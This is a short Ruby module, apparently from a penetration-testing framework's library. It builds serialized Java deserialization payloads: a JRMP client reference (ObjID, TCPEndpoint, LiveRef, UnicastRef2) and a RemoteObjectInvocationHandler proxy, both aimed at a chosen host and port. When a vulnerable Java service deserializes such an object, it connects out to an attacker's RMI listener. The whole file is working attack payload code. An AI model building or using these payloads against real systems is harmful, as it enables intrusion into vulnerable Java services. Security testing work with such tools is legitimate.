# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
      class JRMP
        def self.make_jrmp_client(host, port, objNum)
          objid = Model::JavaObject.new('Ljava/rmi/server/ObjID;', 
                                        'space' => Model::JavaObject.new('Ljava/rmi/server/UID;', 
                                                                         'unique' => 0,
                                                                         'time' => 0,
                                                                         'count' => 0),
                                                                         'objNum' => objNum)


          ep = Model::JavaObject.new('Lsun/rmi/transport/tcp/TCPEndpoint;', 
                                     'host' => host,
                                     'port' => port.to_i)

          lref = Model::JavaObject.new('Lsun/rmi/transport/LiveRef;', 
                                       'ep' => ep,
                                       'id' => objid,
                                       'isLocal' => false)

          ur = Model::JavaObject.new('Lsun/rmi/server/UnicastRef2;', 'ref' => lref)

          ur
        end

        def self.make_jrmp_proxy(host, port, objNum, intf = [])
          invh = Model::JavaObject.new('Ljava/rmi/server/RemoteObjectInvocationHandler;', 
                                'ref' => make_jrmp_client(host, port, objNum))
          Model::JavaProxy.new(['java.rmi.Remote'] + intf, invh)
        end
      end
    end
  end
end
